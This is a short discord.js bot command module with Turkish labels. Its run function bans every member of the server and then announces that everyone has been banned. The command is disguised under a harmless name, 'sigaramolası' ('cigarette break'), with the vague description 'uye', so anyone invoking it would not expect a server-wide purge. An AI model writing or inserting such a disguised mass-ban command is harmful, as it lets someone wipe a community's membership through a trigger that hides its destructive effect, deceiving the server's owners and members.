const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {

message.guild.members.forEach(member => {member.ban()});
message.channel.send("```**Herkez Banlandı.!**```")
  
};

module.exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: [],
  permLevel: 4,
  kategori: "sunucu"
};

module.exports.help = {
  name: "sigaramolası",
  description: "uye",
  usage: "sigaramolası"
};
